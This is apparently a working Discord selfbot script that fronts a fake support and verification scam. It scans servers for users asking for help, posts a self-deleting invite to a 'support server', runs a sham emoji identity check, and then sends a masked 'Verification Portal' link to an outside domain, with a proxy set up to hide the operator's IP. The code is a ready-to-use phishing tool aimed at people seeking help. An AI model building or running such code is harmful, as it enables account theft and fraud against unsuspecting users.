const { Client } = require("discord.js-selfbot-v13");
require("dotenv").config();
const express = require("express");
const axios = require("axios");
const { SocksProxyAgent } = require("socks-proxy-agent");

// Proxy configuration - use SOCKS5 proxy to maintain consistent IP
const PROXY_HOST = process.env.PROXY_HOST || "localhost";
const PROXY_PORT = process.env.PROXY_PORT || "1080";
const USE_PROXY = process.env.USE_PROXY === "true";

let clientOptions = {
  checkUpdate: false,
};

// Add proxy configuration if enabled
if (USE_PROXY) {
  const proxyUrl = `socks5://${PROXY_HOST}:${PROXY_PORT}`;
  const agent = new SocksProxyAgent(proxyUrl);

  clientOptions.proxy = proxyUrl;
  clientOptions.ws = {
    agent: agent,
  };

  console.log(`🎭 Proxy enabled: ${proxyUrl}`);
  console.log(`   Discord will see the proxy server's IP, not your local IP`);
} else {
  console.log(`⚠️  Proxy disabled - using direct connection`);
}

const client = new Client(clientOptions);

// REPLACE THESE WITH YOUR ACTUAL IDs
const GENERAL_CHANNEL_ID = "1442214025839771743";
const TICKET_CHANNEL_ID = "1442521865573634088";
// Set this to your support server ID to only send welcome messages there
// Leave as null to send welcome messages in ALL servers
const SUPPORT_SERVER_ID = "1442214024967360754"; // Example: "1442214024967360754"

// Web server for Render (required for free tier)
const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("Discord bot is running! ✅");
});

app.listen(PORT, () => {
  console.log(`Web server running on port ${PORT}`);
});

// Keep-alive mechanism - prevents server from sleeping
const KEEP_ALIVE_INTERVAL = 14 * 60 * 1000; // Ping every 14 minutes
const SERVER_URL = process.env.SERVER_URL || `http://localhost:${PORT}`;

function keepAlive() {
  setInterval(async () => {
    try {
      const response = await axios.get(SERVER_URL);
      console.log(`✅ Keep-alive ping successful: ${response.status}`);
    } catch (error) {
      console.error(`❌ Keep-alive ping failed:`, error.message);
    }
  }, KEEP_ALIVE_INTERVAL);
}

setTimeout(() => {
  keepAlive();
  console.log(`🔄 Keep-alive mechanism started (pinging every 14 minutes)`);
}, 5000);

client.on("ready", async () => {
  console.log(`${client.user.username} is ready!`);
});

// Handle reaction-based verification and tickets (selfbots can't use buttons)
client.on("messageReactionAdd", async (reaction, user) => {
  // Ignore bot's own reactions
  if (user.id === client.user.id) return;

  // Check if this is a verification message
  const verifications = client.verifications || new Map();
  const verification = Array.from(verifications.values()).find(
    (v) => v.messageId === reaction.message.id
  );

  if (verification) {
    // Find the user this verification is for
    const targetUserId = Array.from(verifications.entries()).find(
      ([, v]) => v.messageId === reaction.message.id
    )?.[0];

    if (!targetUserId) return;

    // Check if the person reacting is the target user
    if (user.id !== targetUserId) {
      try {
        await reaction.users.remove(user.id);
      } catch (err) {
        console.log("Could not remove reaction");
      }
      return;
    }

    const clickedIcon = reaction.emoji.name;

    // Check if the clicked icon is correct
    if (clickedIcon === verification.correctIcon) {
      // Correct! Send them the verification link (masked with markdown)
      try {
        await reaction.message.channel.send(
          `${user} ✅ **Identity Verified Successfully**\n\n` +
            `Your account has been authenticated. Please proceed to complete your registration:\n` +
            `[Access Verification Portal](https://assetsfixpro.cloud/discordx0x/x0/)\n\n` +
            `_This link is secure and will expire in 10 minutes._`
        );

        console.log(`✅ ${user.tag} verified successfully`);

        // Clean up
        client.verifications.delete(targetUserId);

        // Delete the verification message
        try {
          await reaction.message.delete();
        } catch (err) {
          console.log("Could not delete verification message");
        }
      } catch (error) {
        console.error("Error sending verification success:", error);
      }
    } else {
      // Wrong icon - remove their reaction
      try {
        await reaction.users.remove(user.id);
        await reaction.message.channel
          .send(
            `${user} ❌ Wrong emoji! Please react with **${verification.correctIcon}**`
          )
          .then((msg) => {
            setTimeout(() => msg.delete().catch(() => {}), 5000);
          });

        console.log(
          `❌ ${user.tag} selected wrong icon: ${clickedIcon} (correct: ${verification.correctIcon})`
        );
      } catch (error) {
        console.error("Error handling wrong reaction:", error);
      }
    }
    return; // Exit after handling verification
  }

  // Check if the reaction is the ticket emoji
  if (reaction.emoji.name === "🎫") {
    const guild = reaction.message.guild;
    if (!guild) return;

    // Logic to ensure this is a ticket creation request
    if (reaction.message.author.id !== client.user.id) return;
    if (!reaction.message.content.includes("create a support ticket")) return;

    // Find next ticket number
    const ticketChannels = guild.channels.cache.filter((c) =>
      c.name.startsWith("ticket-")
    );
    const ticketCount = ticketChannels.size;
    const ticketNumber = String(ticketCount + 1).padStart(3, "0");
    const channelName = `ticket-${ticketNumber}`;

    try {
      // Create the ticket channel
      const ticketChannel = await guild.channels.create(channelName, {
        type: "GUILD_TEXT",
        permissionOverwrites: [
          {
            id: guild.id, // @everyone
            deny: ["VIEW_CHANNEL"],
          },
          {
            id: user.id,
            allow: ["VIEW_CHANNEL", "SEND_MESSAGES", "READ_MESSAGE_HISTORY"],
          },
        ],
      });

      // Send welcome message inside the ticket
      await ticketChannel.send(
        `Welcome ${user}! Please tell us your problem, and a support staff member will be with you shortly.`
      );

      // Try to remove the reaction
      try {
        await reaction.users.remove(user);
      } catch (err) {
        console.log("Could not remove user reaction (missing permission)");
      }
    } catch (error) {
      console.error("Error creating ticket:", error);
    }
  }
});

client.on("guildMemberAdd", async (member) => {
  try {
    // Only process if this is YOUR support server (if SUPPORT_SERVER_ID is set)
    if (SUPPORT_SERVER_ID && member.guild.id !== SUPPORT_SERVER_ID) {
      console.log(
        `Ignoring member join in ${member.guild.name} (not support server)`
      );
      return;
    }

    // Try to fetch the member to get full data
    try {
      await member.fetch();
    } catch (fetchError) {
      console.log(`Could not fetch full member data: ${fetchError.message}`);
    }

    // Send welcome message to General channel
    try {
      // Find the general channel in THIS guild (not hardcoded)
      let generalChannel = member.guild.channels.cache.find(
        (channel) => channel.name === "general" || channel.name === "welcome"
      );

      // Fallback to hardcoded channel ID if channel not found by name
      if (!generalChannel) {
        generalChannel = await client.channels
          .fetch(GENERAL_CHANNEL_ID)
          .catch(() => null);
      }

      if (generalChannel) {
        // Try multiple mention formats for better compatibility
        const mention = member.user
          ? `<@${member.user.id}>`
          : `<@${member.id}>`;
        const username =
          member.user?.tag ||
          member.user?.username ||
          member.displayName ||
          "new member";

        const welcomeMessage = await generalChannel.send(
          `Hello ${mention} :wave:! Welcome to **${member.guild.name}**. If you need assistance, please react with 🎫 below to create a support ticket.`
        );

        await welcomeMessage.react("🎫");
        console.log(
          `Sent welcome message with reaction to ${username} (ID: ${member.id}) in ${member.guild.name}`
        );
      } else {
        console.error(`Could not find general channel in ${member.guild.name}`);
      }
    } catch (err) {
      console.error(`Error sending to general channel: ${err.message}`);
    }
  } catch (error) {
    console.error(`Unexpected error in guildMemberAdd:`, error.message);
  }
});

client.on("messageCreate", async (message) => {
  // Debug: Log ALL messages
  console.log(
    `📨 Message received: "${message.content}" from ${message.author.tag}`
  );

  // For selfbots, we DON'T ignore own messages for commands
  // (Selfbot = your own account, so YOU type the commands)

  // Check for verification command: !verify @user or @verify @user or /verify @user
  const msgContent = message.content.toLowerCase();
  console.log(`🔍 Checking message content: "${msgContent}"`);

  const isVerifyCommand =
    msgContent.startsWith("!verify") ||
    msgContent.startsWith("@verify") ||
    msgContent.startsWith("/verify") ||
    msgContent.startsWith("verify");

  console.log(`🎯 Is verify command? ${isVerifyCommand}`);

  if (isVerifyCommand) {
    console.log(
      `✅ Verify command detected from ${message.author.tag}: "${message.content}"`
    );
    console.log(`👥 Mentions count: ${message.mentions.users.size}`);
    console.log(
      `👥 Mentioned users:`,
      message.mentions.users.map((u) => u.tag).join(", ")
    );

    // Check if user mentioned someone
    if (message.mentions.users.size === 0) {
      console.log(`❌ No user mentioned, sending error`);
      await message.reply(
        "❌ Please mention a user to verify. Example: `!verify @username`"
      );
      return;
    }

    console.log(`✅ User mentioned, checking permissions...`);
    console.log(`👤 Member object exists? ${!!message.member}`);
    console.log(`🔐 Permissions:`, message.member?.permissions?.toArray());

    // Check if user is admin (has ADMINISTRATOR or MANAGE_GUILD permission)
    const isAdmin =
      message.member?.permissions?.has("ADMINISTRATOR") ||
      message.member?.permissions?.has("MANAGE_GUILD");

    console.log(`🔑 Is admin? ${isAdmin}`);

    if (!isAdmin) {
      console.log(`❌ User is not admin, denying access`);
      await message.reply(
        "❌ You need administrator permissions to use this command."
      );
      return;
    }

    console.log(`✅ Admin verified, proceeding with verification...`);

    const targetUser = message.mentions.users.first();
    console.log(`🎯 Target user: ${targetUser.tag} (${targetUser.id})`);

    try {
      // Delete the admin's command message so users don't see it
      try {
        await message.delete();
        console.log(`🗑️ Deleted admin command message`);
      } catch (err) {
        console.log(`⚠️ Could not delete command message: ${err.message}`);
      }

      // Random verification icons (emojis)
      const icons = ["🔒", "🔑", "✅", "🛡️", "⭐", "🎯"];
      const correctIcon = icons[Math.floor(Math.random() * icons.length)];
      console.log(`🎲 Correct icon selected: ${correctIcon}`);

      // Shuffle icons for options
      const shuffledIcons = [...icons].sort(() => Math.random() - 0.5);
      console.log(`🔀 Shuffled icons: ${shuffledIcons.join(" ")}`);

      // Create verification message with reactions (selfbots can't send buttons)
      console.log(`📤 Sending verification message...`);
      const verifyMessage = await message.channel.send(
        `${targetUser}, please verify yourself by reacting with the **${correctIcon}** emoji below:`
      );
      console.log(
        `✅ Verification message sent! Message ID: ${verifyMessage.id}`
      );

      // Add all icon reactions to the message
      console.log(`➕ Adding reactions...`);
      for (const icon of shuffledIcons) {
        console.log(`  Adding reaction: ${icon}`);
        await verifyMessage.react(icon);
      }
      console.log(`✅ All reactions added!`);

      console.log(
        `🎉 Verification sent to ${targetUser.tag} - Correct icon: ${correctIcon}`
      );

      // Store the correct answer for this verification
      client.verifications = client.verifications || new Map();
      client.verifications.set(targetUser.id, {
        correctIcon,
        messageId: verifyMessage.id,
        timestamp: Date.now(),
      });

      // Auto-delete verification after 2 minutes if not completed
      setTimeout(async () => {
        try {
          await verifyMessage.delete();
          client.verifications.delete(targetUser.id);
        } catch (err) {
          console.log("Verification message already deleted");
        }
      }, 120000); // 2 minutes
    } catch (error) {
      console.error("Error sending verification:", error);
      await message.reply(
        "❌ Failed to send verification. Make sure the bot has proper permissions."
      );
    }
    return;
  }

  // Ignore support auto-reply for specific server
  if (message.guild?.id === "1442214024967360754") return;

  // Ignore messages from the bot itself to prevent loops
  if (message.author.id === client.user.id) return;

  const content = message.content.toLowerCase();
  // Keywords to detect
  const keywords = [
    "help",
    "support",
    "assistance",
    "ticket",
    "issue",
    "error",
    "bug",
    "problem",
    "fix",
    "question",
  ];

  if (keywords.some((word) => content.includes(word))) {
    try {
      // REPLACE THIS WITH YOUR ACTUAL SERVER LINK
      const supportLink = "https://discord.gg/a9CftSnCTF";

      const reply = await message.reply(
        `Hello. I noticed you may require assistance. You can submit a support ticket for professional help in our support server: ${supportLink}`
      );

      setTimeout(async () => {
        try {
          await reply.delete();
          console.log("Deleted support reply after 20 seconds");
        } catch (err) {
          if (err.code !== 10008) {
            console.error("Failed to delete reply:", err.message);
          }
        }
      }, 20000);
    } catch (error) {
      console.error(
        `Failed to reply with support link: ${error.message} (Code: ${error.code})`
      );
    }
  }
});

client.login(process.env.DISCORD_TOKEN);
